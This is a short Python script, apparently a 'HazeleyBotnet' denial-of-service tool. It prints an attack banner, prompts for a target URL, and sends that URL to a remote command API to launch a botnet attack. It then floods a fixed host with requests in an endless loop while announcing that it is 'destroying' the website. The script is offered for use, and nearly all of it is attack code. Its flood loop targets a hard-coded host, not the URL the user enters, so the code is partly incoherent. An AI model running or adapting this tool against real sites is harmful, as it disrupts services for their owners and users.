import requests


print ('''
 #     #                                          
#     #   ##   ###### ###### #      ###### #   # 
#     #  #  #      #  #      #      #       # #  
####### #    #    #   #####  #      #####    #   
#     # ######   #    #      #      #        #   
#     # #    #  #     #      #      #        #   
#     # #    # ###### ###### ###### ######   #   
                                                 
   #                                     
  # #   ##### #####   ##    ####  #    # 
 #   #    #     #    #  #  #    # #   #  
#     #   #     #   #    # #      ####   
#######   #     #   ###### #      #  #   
#     #   #     #   #    # #    # #   #  
#     #   #     #   #    #  ####  #    # 
>--------------------------------------------->
make use of Python3 for HazeleyBotnet
                            C0d3d by Hazeley
╔═════════════════════════════════════════════╗
║        pls: Don't attack .gov website       ║
║─────────────────────────────────────────────║
║                 Note:                       ║
║ + Don't include any forward slash           ║
║   at the back of the target URL             ║
║                                             ║
║                                             ║
║─────────────────────────────────────────────║
║ Link: https://github.com/medal007/hazeley   ║
╚═════════════════════════════════════════════╝
''')

URL = str(input("Input Target URL(press space and enter to start attack): "))
count = 0
API_ENDPOINT = "http://api.sourcecoderz.sl/api/sendcommand/"

# data to be sent to api
data = {'url': URL,
        'server': '1',
}

# sending post request and saving response as response object
r = requests.post(url=API_ENDPOINT, data=data)

print(r.json())

while True:
    response = requests.get(url="http://botnet.medal-media.com")
    response1 = requests.get(url="http://botnet.medal-media.com")
    response2 = requests.get(url="http://botnet.medal-media.com")
    response3 = requests.get(url="http://botnet.medal-media.com")
    count = count + 1
    print("HazeleyBotnet destroying website in round " + str(count))